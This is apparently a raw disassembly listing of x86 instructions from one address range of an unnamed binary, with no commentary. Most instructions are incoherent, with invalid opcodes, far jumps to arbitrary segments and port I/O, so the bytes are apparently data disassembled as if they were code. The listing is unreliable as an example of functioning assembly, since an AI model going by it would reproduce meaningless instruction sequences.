  40c1c3:	mov    eax,0x5c97f946
  40c1c8:	and    DWORD PTR [eax],ecx
  40c1ca:	push   ss
  40c1cb:	leave  
  40c1cc:	inc    ebp
  40c1cd:	jbe    0x40c1e8
  40c1cf:	xchg   esi,eax
  40c1d0:	retf   0x9fef
  40c1d3:	retf   
  40c1d4:	xor    ecx,edx
  40c1d6:	std    
  40c1d7:	rcr    BYTE PTR [ebx-0x1c],cl
  40c1da:	div    BYTE PTR [ebx-0x1b]
  40c1dd:	sub    DWORD PTR [esi-0x1e],esi
  40c1e0:	pushf  
  40c1e1:	adc    eax,0x42a30051
  40c1e6:	or     ebx,DWORD PTR [esi+0x2bb05d30]
  40c1ec:	and    al,bl
  40c1ee:	outs   dx,BYTE PTR ds:[esi]
  40c1ef:	jmp    0xcb50d5fa
  40c1f4:	lock and ebp,esp
  40c1f7:	xchg   ebp,eax
  40c1f8:	push   esi
  40c1f9:	int    0x73
  40c1fb:	xchg   DWORD PTR [edx-0x22],edi
  40c1fe:	sub    eax,0x13a67461
  40c203:	sbb    al,0x99
  40c206:	xor    al,0xbf
  40c208:	popf   
  40c209:	ret    
  40c20a:	and    eax,DWORD PTR [ebp+0x2a]
  40c20d:	mov    eax,0x2d14f765
  40c212:	or     bh,BYTE PTR [ebp-0x16]
  40c215:	push   eax
  40c216:	sub    BYTE PTR [edx+0x70ac566c],bl
  40c21c:	dec    ebp
  40c21d:	cmp    BYTE PTR [eax],ch
  40c21f:	cmp    eax,0x312f49f2
  40c224:	(bad)  
  40c226:	jl     0x40c267
  40c228:	jmp    0xf16e:0x19fea1a5
  40c22f:	xchg   DWORD PTR [esi],edi
  40c231:	ja     0x40c222
  40c233:	mov    eax,ds:0x9c8a5e49
  40c238:	cmc    
  40c239:	xchg   edi,eax
  40c23a:	int3   
  40c23b:	inc    ebx
  40c23c:	push   ss
  40c23d:	push   edx
  40c23e:	adc    esp,DWORD PTR [edi]
  40c240:	mov    ecx,0x71fc156b
  40c245:	jle    0x40c1d7
  40c247:	xchg   ecx,eax
  40c248:	imul   edx,ebx,0xeab37db4
  40c24e:	lods   eax,DWORD PTR ds:[esi]
  40c24f:	test   al,0x32
  40c251:	inc    esp
  40c252:	adc    ah,BYTE PTR [esi-0x6d27688d]
  40c258:	cld    
  40c259:	aad    0xb3
  40c25b:	test   BYTE PTR [ebx+eiz*8-0x4a],al
  40c25f:	mov    WORD PTR [eax-0x3a],cs
  40c262:	ret    
  40c263:	iret   
  40c264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c265:	jno    0x40c2a4
  40c267:	inc    edi
  40c268:	push   ebx
  40c269:	enter  0x6d09,0x1b
  40c26d:	sbb    DWORD PTR [edx+0x3],edi
  40c270:	xor    DWORD PTR [ebx+ecx*8-0x5f],esi
  40c274:	jg     0x40c242
  40c276:	mov    eax,0xa472dcba
  40c27b:	sar    DWORD PTR [ebp-0xe3a3fd0],cl
  40c281:	popf   
  40c282:	mov    dl,0x8e
  40c284:	or     ebx,eax
  40c286:	clc    
  40c287:	out    0xf5,al
  40c289:	repz mov ds:0x720fc5a8,al
  40c28f:	adc    al,BYTE PTR [ecx]
  40c291:	add    BYTE PTR [ecx],al
  40c293:	retf   0xa345
  40c296:	lock ret 
  40c298:	(bad)  
  40c299:	iret   
  40c29a:	out    dx,eax
  40c29b:	pop    eax
  40c29c:	mov    edx,0x6cbbb5db
  40c2a1:	and    BYTE PTR [edx+0x46cde939],al
  40c2a7:	fmulp  st(5),st
  40c2a9:	lahf   
  40c2aa:	mov    bh,0x6e
  40c2ac:	sbb    esi,edi
  40c2ae:	inc    edx
  40c2af:	test   DWORD PTR [ebx-0x37],edi
  40c2b2:	stos   DWORD PTR es:[edi],eax
  40c2b3:	ror    BYTE PTR [ecx+edx*2+0x33c5bee2],1
  40c2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2bb:	mov    cl,0x8a
  40c2bd:	jle    0x40c2a9
  40c2bf:	jmp    0x40c32c
  40c2c1:	mov    ecx,0xd8850082
  40c2c6:	mov    ecx,0x8bf3f5b2
  40c2cb:	pop    ds
  40c2cc:	stos   BYTE PTR es:[edi],al
  40c2cd:	ror    edx,0x9a
  40c2d0:	jnp    0x40c312
  40c2d2:	das    
  40c2d3:	inc    edi
  40c2d4:	dec    ebp
  40c2d5:	mov    ecx,0xb8b5780a
  40c2da:	dec    edi
  40c2db:	mov    ebx,0xf5eeb68c
  40c2e0:	jns    0x40c2a8
  40c2e2:	dec    eax
  40c2e3:	lock (bad) 
  40c2e5:	call   0x1b8ec7a1
  40c2ea:	jns    0x40c2cb
  40c2ec:	inc    eax
  40c2ed:	pop    ecx
  40c2ee:	jmp    0x15c0:0x2e4e7ba0
  40c2f5:	je     0x40c36b
  40c2f7:	mov    edi,0x9dfa35b1
  40c2fc:	sub    al,0x0
  40c2fe:	test   BYTE PTR [ebx-0x67a711ad],cl
  40c304:	push   ebp
  40c305:	xor    edi,DWORD PTR ds:0x2844e5dd
  40c30b:	xlat   BYTE PTR ds:[ebx]
  40c30c:	mov    BYTE PTR [ebp+0x3c],ah
  40c30f:	jmp    0x40c2ec
  40c311:	ins    BYTE PTR es:[edi],dx
  40c312:	daa    
  40c313:	pop    eax
  40c314:	adc    ebx,DWORD PTR [edx-0x230967c1]
  40c31a:	jae    0x40c326
  40c31c:	mov    ah,0x22
  40c31e:	adc    DWORD PTR [edx+0xc],ecx
  40c321:	rol    DWORD PTR [eax],0x3b
  40c324:	push   ecx
  40c325:	inc    esi
  40c326:	jmp    0x2dea:0x6325bfaa
  40c32d:	aaa    
  40c32e:	pop    edi
  40c32f:	aam    0xcc
  40c331:	pusha  
  40c332:	push   cs
  40c333:	test   al,0x93
  40c335:	std    
  40c336:	adc    BYTE PTR [eax+0x19120fdd],dl
  40c33c:	mov    ah,0xcf
  40c33e:	adc    BYTE PTR [ecx-0x152acd66],al
  40c344:	call   0xb705:0xbade4ca4
  40c34b:	iret   
  40c34c:	test   al,0xe5
  40c34e:	imul   edx,DWORD PTR [edi],0xa6d090b2
  40c354:	into   
  40c355:	sbb    eax,0xd06233ab
  40c35a:	outs   dx,DWORD PTR ds:[esi]
  40c35b:	dec    ebp
  40c35c:	loopne 0x40c2e9
  40c35e:	cmp    al,bl
  40c360:	mov    cl,0x32
  40c362:	cwde   
  40c363:	(bad)  
  40c364:	fwait
  40c365:	lods   eax,DWORD PTR ds:[esi]
  40c366:	sbb    eax,ecx
  40c368:	call   0xeb11:0x2946a5de
  40c36f:	mov    bl,0xc7
  40c371:	fxch   st(7)
  40c373:	mov    esp,gs
  40c375:	rol    BYTE PTR [edx+0x28bdf3b0],1
  40c37b:	icebp  
  40c37c:	addr16 std 
  40c37e:	lahf   
  40c37f:	loop   0x40c3ae
  40c381:	into   
  40c382:	cmp    al,0x42
  40c384:	clc    
  40c385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c386:	jb     0x40c39c
  40c388:	pop    DWORD PTR [edx]
  40c38a:	inc    eax
  40c38b:	std    
  40c38c:	lock sti 
  40c38e:	outs   dx,BYTE PTR ds:[esi]
  40c38f:	sub    eax,0xf1513aa8
  40c394:	jmp    0x40c3c1
  40c396:	in     al,dx
  40c397:	add    al,0x18
  40c399:	enter  0x91a4,0xb5
  40c39d:	xchg   BYTE PTR [ebx],bl
  40c39f:	xchg   bl,ah
  40c3a1:	adc    eax,0x46e60d43
  40c3a6:	dec    edx
  40c3a7:	and    ebp,esp
  40c3a9:	scas   eax,DWORD PTR es:[edi]
  40c3aa:	sbb    DWORD PTR [edi],esp
  40c3ac:	aaa    
  40c3ad:	es call 0x7993:0x62026f9f
  40c3b5:	pushf  
  40c3b6:	aam    0x66
  40c3b8:	push   esi
  40c3b9:	stc    
  40c3ba:	fistp  WORD PTR [ebx+ebx*8]
  40c3bd:	out    dx,al
  40c3be:	(bad)  
  40c3bf:	iret   
  40c3c0:	pushf  
  40c3c1:	loopne 0x40c3b3
  40c3c3:	sub    dl,BYTE PTR [ebx+0x58]
  40c3c6:	(bad)  
  40c3c7:	shl    BYTE PTR [ebx+ecx*4],cl
  40c3ca:	iret   
  40c3cb:	mov    ah,0xcc
  40c3cd:	mov    ebx,0x7ca55f0
  40c3d2:	cwde   
  40c3d3:	push   0xfffffff8
  40c3d5:	fild   DWORD PTR [edx]
  40c3d7:	jge    0x40c3fc
  40c3d9:	loopne 0x40c405
  40c3db:	dec    ebp
  40c3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3dd:	xchg   edx,eax
  40c3de:	aad    0x26
  40c3e0:	aam    0x17
  40c3e2:	push   eax
  40c3e3:	sub    BYTE PTR [edi+0x40cfe328],0xb0
  40c3ea:	inc    edi
  40c3eb:	add    bl,BYTE PTR [edx-0x3e]
  40c3ee:	rol    BYTE PTR [edi-0x71],0x1
  40c3f2:	fwait
  40c3f3:	(bad)  
  40c3f4:	push   ds
  40c3f5:	aam    0xd8
  40c3f7:	jo     0x40c3c1
  40c3f9:	cmp    ch,BYTE PTR ds:0x79f2fef3
  40c3ff:	jbe    0x40c3a3
  40c401:	mov    cl,BYTE PTR [ecx-0x827a38b]
  40c407:	das    
  40c408:	push   ds
  40c409:	loope  0x40c395
  40c40b:	adc    eax,0x6d0fbad0
  40c410:	out    0x59,al
  40c412:	adc    edi,ebp
  40c414:	pushf  
  40c415:	jmp    0x2b67:0x82433353
  40c41c:	mov    eax,ds:0x239096d1
  40c421:	(bad)  
  40c422:	xor    al,0xeb
  40c424:	popa   
  40c425:	sbb    eax,0x8e0d15ba
  40c42a:	out    dx,al
  40c42b:	jae    0x40c41c
  40c42d:	cmp    DWORD PTR [eax+0x3c8084de],esp
  40c433:	js     0x40c46c
  40c435:	mov    ?,eax
  40c437:	test   eax,0x4d797751
  40c43c:	sbb    DWORD PTR [eax-0x6b],ebx
  40c43f:	jge    0x40c3c8
  40c441:	pop    es
  40c442:	je     0x40c450
  40c444:	adc    BYTE PTR [ecx],0xef
  40c447:	mov    al,0x8e
  40c449:	lea    ebx,[ebx]
  40c44b:	outs   dx,BYTE PTR ds:[esi]
  40c44c:	in     eax,dx
  40c44d:	(bad)  
  40c44e:	cwde   
  40c44f:	(bad)  [esi+0x56cb91f8]
  40c455:	inc    edx
  40c456:	inc    DWORD PTR [eax]
  40c458:	sbb    bl,dl
  40c45a:	arpl   WORD PTR [eax-0x2e],si
  40c45d:	pop    ecx
  40c45e:	adc    esp,ecx
  40c460:	cli    
  40c461:	pop    esp
  40c462:	loope  0x40c417
  40c464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c465:	xlat   BYTE PTR ds:[ebx]
  40c466:	ret    0xb022
  40c469:	stc    
  40c46a:	les    ecx,FWORD PTR [eax+0x66]
  40c46d:	cdq    
  40c46e:	pop    esi
  40c46f:	es test al,0x31
  40c472:	push   0x914fa4c
  40c477:	cmp    eax,0xfd6ddea0
  40c47c:	repz dec eax
  40c47e:	mov    esi,0xebc952
  40c483:	mov    ebp,0xc4eff1bf
  40c488:	imul   esi,DWORD PTR [ebx-0x4f],0xfffffffc
  40c48c:	lods   al,BYTE PTR ds:[esi]
  40c48d:	xchg   edi,eax
  40c48e:	ret    0x53d1
  40c491:	and    eax,0xf91901a9
  40c496:	xchg   ch,cl
  40c498:	or     DWORD PTR [esi+0x50],0x1cfaf876
  40c49f:	cmp    bl,BYTE PTR [eax+ebp*2]
  40c4a2:	dec    edi
  40c4a3:	xor    eax,DWORD PTR [ebp-0x2416f282]
  40c4a9:	test   eax,0x6d3f2c2
  40c4ae:	and    DWORD PTR [esi+eax*2-0x3d041e50],ecx
  40c4b5:	fwait
  40c4b6:	mov    ah,0x6b
  40c4b8:	nop
  40c4b9:	mov    gs,ebp
  40c4bb:	jns    0x40c50e
  40c4bd:	jo     0x40c520
  40c4bf:	push   esi
  40c4c0:	add    eax,0xc16e1075
  40c4c5:	ins    DWORD PTR es:[edi],dx
  40c4c6:	outs   dx,DWORD PTR ds:[esi]
  40c4c7:	ret    0x902b
  40c4ca:	sub    cl,BYTE PTR cs:[esi-0x63657d54]
  40c4d1:	nop
  40c4d2:	xor    DWORD PTR [esp+ebx*2+0x10e3fc94],eax
  40c4d9:	jb     0x40c4b2
  40c4db:	cmp    BYTE PTR [ebp+ebp*2-0x68488e47],dl
  40c4e2:	out    dx,al
  40c4e3:	es out 0x58,al
  40c4e6:	retf   0x30b5
  40c4e9:	sbb    BYTE PTR [ecx+0x5f536acf],dl
  40c4ef:	push   edi
  40c4f0:	cdq    
  40c4f1:	stos   DWORD PTR es:[edi],eax
  40c4f2:	xor    al,0x98
  40c4f4:	ret    0x40df
  40c4f7:	neg    BYTE PTR [bp+si+0x70]
  40c4fb:	cmp    al,0xc7
  40c4fd:	cmp    BYTE PTR [esi-0x1a],cl
  40c500:	jmp    0xf8e1b41b
  40c505:	repnz mov bh,0x87
  40c508:	xor    DWORD PTR [edx-0x3269fa1d],ebx
  40c50e:	mov    eax,0xc534ab74
  40c513:	fdivrp st(4),st
  40c515:	jae    0x40c511
  40c517:	cmp    esi,DWORD PTR [ebp-0x70]
  40c51a:	dec    ebp
  40c51b:	mov    edx,0xcd91dc7d
  40c520:	int    0x5
  40c522:	push   ebp
  40c523:	push   ebp
  40c524:	test   ebx,0xe27547f7
  40c52a:	sub    dl,cl
  40c52c:	loope  0x40c4fe
  40c52e:	int3   
  40c52f:	ss int3 
  40c531:	hlt    
  40c532:	jnp    0x40c4f6
  40c534:	mov    DWORD PTR [ebp+0x6034cdcc],0x68262aa7
  40c53e:	cwde   
  40c53f:	mov    ecx,DWORD PTR [ebx-0x3ca6327d]
  40c545:	lds    ecx,FWORD PTR [esi-0x691eaf97]
  40c54b:	bound  ebx,QWORD PTR [esi]
  40c54d:	fs jne 0x40c545
  40c550:	push   ss
  40c551:	push   ds
  40c552:	inc    esp
  40c553:	push   edi
  40c554:	(bad)  
  40c556:	push   esp
  40c557:	xchg   bx,ax
  40c559:	lahf   
  40c55a:	stos   DWORD PTR es:[edi],eax
  40c55b:	jae    0x40c571
  40c55d:	xchg   esp,eax
  40c55e:	and    al,0x60
  40c560:	clc    
  40c561:	shl    DWORD PTR [edx-0x3c2ec6d9],cl
  40c567:	sub    al,0x8a
  40c569:	pop    esp
  40c56a:	and    edx,esi
  40c56c:	and    eax,0xd57087e7
  40c571:	push   ebp
  40c572:	adc    bl,cl
  40c574:	jle    0x40c5c0
  40c576:	mov    bl,0x81
  40c578:	jge    0x40c552
  40c57a:	xchg   BYTE PTR [esi+0xb4efc6c],ah
  40c580:	(bad)  
  40c581:	out    dx,al
  40c582:	arpl   sp,sp
  40c584:	jae    0x40c5a2
  40c586:	inc    ebp
  40c587:	pop    ds
  40c588:	jns    0x40c56c
  40c58a:	aaa    
  40c58b:	icebp  
  40c58c:	sbb    DWORD PTR [edi+0x4a],ebp
  40c58f:	ret    
  40c590:	stos   BYTE PTR es:[edi],al
  40c591:	jl     0x40c571
  40c593:	inc    esi
  40c594:	aas    
  40c595:	mov    eax,ds:0x2d677557
  40c59a:	lods   eax,DWORD PTR ds:[esi]
  40c59b:	stc    
  40c59c:	fcomp  DWORD PTR [esi]
  40c59e:	mov    ds:0xafadd537,eax
  40c5a3:	into   
  40c5a4:	pop    ebx
  40c5a5:	and    eax,0x9778c9a4
  40c5aa:	outs   dx,DWORD PTR ds:[esi]
  40c5ab:	jge    0x40c56d
  40c5ad:	mov    esi,DWORD PTR [ecx]
  40c5af:	mov    edx,0x3d8f1c3d
  40c5b4:	js     0x40c600
  40c5b6:	mov    al,ds:0x19c00548
  40c5bb:	mov    ah,0x27
  40c5bd:	push   ebp
  40c5be:	dec    eax
  40c5bf:	fucomip st,st(2)
  40c5c1:	js     0x40c630
  40c5c3:	loopne 0x40c5db
  40c5c5:	cmp    ebx,ebx
  40c5c7:	lods   eax,DWORD PTR ds:[esi]
  40c5c8:	pop    edi
  40c5c9:	lods   al,BYTE PTR ds:[esi]
  40c5ca:	ret    
  40c5cb:	pop    ss
  40c5cc:	sub    bl,BYTE PTR [ebp+0x5db0d100]
  40c5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d3:	mov    al,0x5b
  40c5d5:	dec    ebp
  40c5d6:	jnp    0x40c564
  40c5d8:	xor    ch,0x4b
  40c5db:	xchg   ecx,eax
  40c5dc:	jle    0x40c5b3
  40c5de:	bound  esi,QWORD PTR [edi]
  40c5e0:	mov    cl,0xba
  40c5e2:	xchg   edi,eax
  40c5e3:	leave  
  40c5e4:	mov    esp,0x4e2f6111
  40c5e9:	xlat   BYTE PTR ds:[ebx]
  40c5ea:	pop    edi
  40c5eb:	jp     0x40c59e
  40c5ed:	in     al,0x17
  40c5ef:	push   ss
  40c5f0:	(bad)  
  40c5f1:	aam    0xfb
  40c5f3:	dec    DWORD PTR [edx]
  40c5f5:	fld    DWORD PTR [eax]
  40c5f7:	xchg   DWORD PTR es:[ebx-0x26fc191d],edi
  40c5fe:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c600:	shl    DWORD PTR [edi],0xee
  40c603:	push   cs
  40c604:	dec    ecx
  40c605:	inc    edi
  40c606:	stos   DWORD PTR es:[edi],eax
  40c607:	mov    cl,0x45
  40c609:	js     0x40c63f
  40c60b:	fdiv   st,st(4)
  40c60d:	mov    ds:0x6fc3e95c,al
  40c612:	pop    ebp
  40c613:	aam    0xa2
  40c615:	ins    DWORD PTR es:[edi],dx
  40c616:	mov    ch,BYTE PTR [esi+0x1d245a76]
  40c61c:	mov    BYTE PTR [eax-0x5e],dh
  40c61f:	inc    esp
  40c620:	mov    ds:0x68b1d3ca,al
  40c625:	sub    dh,BYTE PTR [edi-0x71e4885a]
  40c62b:	adc    ch,BYTE PTR [ecx-0x6f691e99]
  40c631:	xchg   DWORD PTR [edi],ebx
  40c633:	adc    bl,BYTE PTR [esi-0x7decf2cd]
  40c639:	(bad)  
  40c63a:	adc    cl,dh
  40c63c:	inc    edx
  40c63d:	pop    ebx
  40c63e:	sbb    DWORD PTR [edi],0xffffff85
  40c641:	xchg   edx,eax
  40c642:	dec    esp
  40c643:	(bad)  
  40c645:	xor    al,0x7f
  40c647:	add    DWORD PTR [esi],edx
  40c649:	mov    ch,0xb4
  40c64b:	add    bh,dh
  40c64d:	push   ecx
  40c64e:	bound  esp,QWORD PTR [esi+0x2a]
  40c651:	loop   0x40c68f
  40c653:	or     BYTE PTR [esi-0x5],bl
  40c656:	enter  0xe9b9,0x26
  40c65a:	push   0xa78c4c4c
  40c65f:	cmp    BYTE PTR [ebx+0x34],ah
  40c662:	sub    eax,0xf7808e4e
  40c667:	jp     0x40c67e
  40c669:	retf   0x17a7
  40c66c:	mov    ebp,0xebd2f7e0
  40c671:	sbb    dl,ah
  40c673:	cmp    ch,BYTE PTR [eax+0x2a6ba6c4]
  40c679:	dec    esp
  40c67a:	lds    ebp,FWORD PTR [esi-0x11]
  40c67d:	popa   
  40c67e:	sub    BYTE PTR [edi*2+0x6feb37e],ch
  40c685:	outs   dx,BYTE PTR ds:[esi]
  40c686:	(bad)  
  40c687:	lods   eax,DWORD PTR ds:[esi]
  40c688:	daa    
  40c689:	xchg   edx,eax
  40c68a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68b:	or     al,0xd8
  40c68d:	loopne 0x40c6b2
  40c68f:	sub    dh,BYTE PTR [edi-0xf0ee1f2]
  40c695:	xchg   ecx,eax
  40c696:	or     DWORD PTR [esi+edx*8+0x14],edi
  40c69a:	cld    
  40c69b:	cmp    bh,dh
  40c69d:	rcr    DWORD PTR [ecx],cl
  40c69f:	(bad)  
  40c6a0:	push   0xffffff84
  40c6a2:	test   BYTE PTR [edi+eax*8],ah
  40c6a5:	ins    DWORD PTR es:[edi],dx
  40c6a6:	mov    eax,ds:0x356aec04
  40c6ab:	sbb    eax,DWORD PTR [eax+0x4b]
  40c6ae:	xchg   esp,eax
  40c6af:	pop    eax
  40c6b0:	cld    
  40c6b1:	ret    
  40c6b2:	cmp    BYTE PTR [ecx],bl
  40c6b4:	mov    ah,0x2b
  40c6b6:	mov    WORD PTR [esi],es
  40c6b8:	mov    ebx,0x139dde28
  40c6bd:	mov    DWORD PTR [edx],edx
  40c6bf:	(bad)  
  40c6c0:	mov    ebp,esi
  40c6c2:	sbb    ch,BYTE PTR [edi]
  40c6c4:	mov    bh,0x68
  40c6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c7:	ficom  WORD PTR [eax+0x3f8c8b39]
  40c6cd:	pop    ss
  40c6ce:	sub    DWORD PTR [ecx-0x5ec343c3],esi
  40c6d4:	lods   eax,DWORD PTR ds:[esi]
  40c6d5:	les    ebp,FWORD PTR [esi-0x65]
  40c6d8:	jmp    0x19e5:0xcb18160a
  40c6df:	jmp    0xad07:0x56667e68
  40c6e6:	mov    al,dh
  40c6e8:	loop   0x40c709
  40c6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6eb:	scas   eax,DWORD PTR es:[edi]
  40c6ec:	pop    eax
  40c6ed:	xor    eax,0x22160472
  40c6f2:	mov    dl,0x7
  40c6f4:	sbb    DWORD PTR [ebx+ebx*8+0x24],edi
  40c6f8:	xor    al,0x62
  40c6fa:	out    0x97,eax
  40c6fc:	(bad)  
  40c6fd:	das    
  40c6fe:	sbb    al,0x44
  40c700:	push   ebp
  40c701:	xchg   DWORD PTR [ebp-0x62ccfc19],ebp
  40c707:	adc    al,0x86
  40c709:	repnz pop ss
  40c70b:	sti    
  40c70c:	(bad)  
  40c70d:	adc    eax,0xdad56b9e
  40c712:	jecxz  0x40c774
  40c714:	mov    eax,ds:0xf01b2592
  40c719:	inc    ecx
  40c71a:	xor    DWORD PTR [edx-0x20],edx
  40c71d:	loope  0x40c78d
  40c71f:	aad    0x61
  40c721:	mov    cl,0x40
  40c723:	repz sub eax,0x582c4256
  40c729:	mov    al,0x4b
  40c72b:	jg     0x40c79d
  40c72d:	sbb    al,0xe6
  40c72f:	ret    
  40c730:	or     al,BYTE PTR [edx]
  40c732:	pop    ecx
  40c733:	mov    esi,0x35124c12
  40c738:	pop    esi
  40c739:	push   edx
  40c73a:	mov    ds:0x25737d5d,eax
  40c73f:	fwait
  40c740:	mov    eax,0x4d183379
  40c745:	inc    esi
  40c746:	sub    bl,BYTE PTR [ebx-0x72]
  40c749:	xchg   ebp,eax
  40c74a:	jno    0x40c778
  40c74c:	cmp    cl,cl
  40c74e:	aaa    
  40c74f:	mov    al,ds:0xa1b7a1f3
  40c754:	int    0x85
  40c756:	iret   
  40c757:	cmp    esp,DWORD PTR [esi]
  40c759:	leave  
  40c75a:	nop
  40c75b:	dec    ecx
  40c75c:	jae    0x40c748
  40c75e:	mov    esp,0xc50ef86f
  40c763:	push   ebx
  40c764:	dec    DWORD PTR [ebx]
  40c766:	dec    edi
  40c767:	push   eax
  40c768:	popa   
  40c769:	sbb    eax,0x34d9d45b
  40c76e:	dec    edx
  40c76f:	pop    esp
  40c771:	mov    al,ds:0xa2d242b2
  40c776:	imul   ebx,DWORD PTR [edi+0x30482424],0x1b
  40c77d:	(bad)  
  40c77e:	clc    
  40c77f:	sbb    eax,0x799710d7
  40c784:	cmp    BYTE PTR [edx+0x4602bf4d],0x57
  40c78b:	jne    0x40c718
  40c78d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c78f:	loopne 0x40c7af
  40c791:	hlt    
  40c792:	sahf   
  40c793:	loopne 0x40c7fc
  40c795:	add    DWORD PTR [ebx],esp
  40c797:	(bad)  
  40c798:	fcomp  DWORD PTR [eax]
  40c79a:	ret    0xeec1
  40c79d:	fnsave ds:0x502771dc
  40c7a3:	xchg   ebx,eax
  40c7a4:	cmp    BYTE PTR [eax],dl
  40c7a6:	aas    
  40c7a7:	sbb    DWORD PTR [edi],0x15ac60d9
  40c7ad:	inc    esi
  40c7ae:	push   0xffffffd3
  40c7b0:	ja     0x40c7e8
  40c7b2:	fs clc 
  40c7b4:	adc    eax,0x10146701
  40c7b9:	jnp    0x40c7b7
  40c7bb:	nop
  40c7bc:	hlt    
  40c7bd:	mov    al,ds:0xd9cefe0f
  40c7c2:	jg     0x40c7a6
  40c7c4:	out    0xbb,al
  40c7c6:	cld    
  40c7c7:	mov    dh,0x17
  40c7c9:	dec    esi
  40c7ca:	add    al,0x57
  40c7cc:	lds    eax,FWORD PTR [edi+0x1b]
  40c7cf:	(bad)  
  40c7d0:	mov    al,0x83
  40c7d2:	xor    eax,0xdae7f3f4
  40c7d7:	ss inc edi
  40c7d9:	addr16 call 0xfab0c915
  40c7df:	adc    DWORD PTR [ebp+0x69],ecx
  40c7e2:	jmp    0x16f8:0x9170fdf7
  40c7e9:	lods   al,BYTE PTR ds:[esi]
  40c7ea:	mov    bh,0xb4
  40c7ec:	jns    0x40c78a
  40c7ee:	mov    dh,0xb6
  40c7f0:	mov    al,0xe3
  40c7f2:	cmp    al,0x6c
  40c7f4:	js     0x40c82d
  40c7f6:	sub    BYTE PTR [ecx-0x2],dl
  40c7f9:	iret   
  40c7fa:	and    al,0xcf
  40c7fc:	add    eax,0x7ff173de
  40c801:	jne    0x40c7ec
  40c803:	ret    0x984a
  40c806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c807:	pushf  
  40c808:	add    DWORD PTR [ecx-0x94254eb],ebp
  40c80e:	test   eax,0x710d179a
  40c813:	scas   eax,DWORD PTR es:[edi]
  40c814:	aad    0xbc
  40c816:	ret    
  40c817:	jbe    0x40c886
  40c819:	pop    eax
  40c81a:	jp     0x40c896
  40c81c:	push   eax
  40c81d:	call   0x4c503bf2
  40c822:	push   ebp
  40c823:	sbb    DWORD PTR [edx+0x72],0x95f144e9
  40c82a:	xor    edx,DWORD PTR [ebp+0x71770feb]
  40c830:	jns    0x40c81d
  40c832:	aam    0x1c
  40c834:	mov    WORD PTR [ebx],cs
  40c836:	dec    edi
  40c837:	stc    
  40c838:	add    esi,DWORD PTR [ebx+0x4a2b78c2]
  40c83e:	repz leave 
  40c840:	fisub  WORD PTR [edx]
  40c842:	loop   0x40c7f5
  40c844:	and    ecx,ebx
  40c846:	ror    DWORD PTR [edi],0x71
  40c849:	(bad)  
  40c84a:	sub    eax,0x6a045a9a
  40c84f:	sti    
  40c850:	stc    
  40c851:	lsl    esi,WORD PTR [edx]
  40c854:	adc    ah,BYTE PTR [edx-0x170a528a]
  40c85a:	(bad)  
  40c85b:	push   esp
  40c85c:	xchg   edi,eax
  40c85d:	fcom   QWORD PTR [edi-0x17]
  40c860:	xor    BYTE PTR [esi],ch
  40c862:	sbb    al,0x15
  40c864:	mov    bh,cl
  40c866:	ins    BYTE PTR es:[edi],dx
  40c867:	jae    0x40c85e
  40c869:	mov    eax,DWORD PTR [eax+0x35]
  40c86c:	arpl   WORD PTR [ebp+0x70],ax
  40c86f:	popf   
  40c870:	jns    0x40c840
  40c872:	nop
  40c873:	call   0xa536:0xfd85de10
  40c87a:	aaa    
  40c87b:	aaa    
  40c87c:	xchg   ecx,eax
  40c87d:	es ds es lock hlt 
  40c882:	pop    edx
  40c883:	add    ebx,DWORD PTR [edx-0x75]
  40c886:	and    al,0x4f
  40c888:	mov    dh,0xe2
  40c88a:	mov    ds:0x267bc576,eax
  40c88f:	sbb    DWORD PTR [esi-0x49],ebx
  40c892:	mov    eax,0xc29f2d4f
  40c897:	es stos WORD PTR es:[edi],ax
  40c89a:	int3   
  40c89b:	cmp    edx,esp
  40c89d:	pop    edx
  40c89e:	sbb    BYTE PTR ds:[eax+0x2f0a0a0a],dh
  40c8a5:	mov    ebx,edi
  40c8a7:	fidiv  DWORD PTR [eax]
  40c8a9:	sub    eax,0xcace83c4
  40c8ae:	mov    dh,0xb3
  40c8b0:	ret    0x1c36
  40c8b3:	push   es
  40c8b4:	pop    ebx
  40c8b5:	repz popf 
  40c8b7:	mov    esp,DWORD PTR [ebx-0x4e]
  40c8ba:	push   ds
  40c8bb:	xor    BYTE PTR [ecx-0x44],0x53
  40c8bf:	in     eax,dx
  40c8c0:	mov    ecx,0x7115c288
  40c8c5:	push   es
  40c8c6:	xchg   edi,eax
  40c8c7:	jl     0x40c940
  40c8c9:	scas   eax,DWORD PTR es:[edi]
  40c8ca:	adc    bl,ch
  40c8cc:	inc    esi
  40c8cd:	lods   eax,DWORD PTR ds:[esi]
  40c8ce:	xor    edi,ebx
  40c8d0:	jne    0x40c930
  40c8d2:	es ins DWORD PTR es:[edi],dx
  40c8d4:	dec    eax
  40c8d5:	in     eax,0x61
  40c8d7:	and    BYTE PTR [edx-0x54],0xed
  40c8db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8dc:	pop    ebx
  40c8dd:	push   es
  40c8de:	xor    BYTE PTR ds:0x7be408b0,cl
  40c8e4:	mov    ds:0x2a55ab7d,al
  40c8e9:	test   BYTE PTR [ebx],0x98
  40c8ec:	in     al,dx
  40c8ed:	(bad)  
  40c8ee:	mov    esp,DWORD PTR [edi+0x16]
  40c8f1:	stos   BYTE PTR es:[edi],al
  40c8f2:	aad    0x4e
  40c8f4:	(bad)  
  40c8f5:	mov    ecx,cs
  40c8f7:	xchg   edi,eax
  40c8f8:	jp     0x40c91b
  40c8fa:	ins    DWORD PTR es:[edi],dx
  40c8fb:	nop
  40c8fc:	dec    edx
  40c8fd:	pusha  
  40c8fe:	cwde   
  40c8ff:	out    0xed,al
  40c901:	aas    
  40c902:	jmp    0x40c8c5
  40c904:	adc    dh,dh
  40c906:	jmp    0x40c906
  40c908:	xchg   edx,esp
  40c90a:	bound  esp,QWORD PTR [edx-0x529a69ed]
  40c910:	jne    0x40c8fe
  40c912:	or     al,0xa6
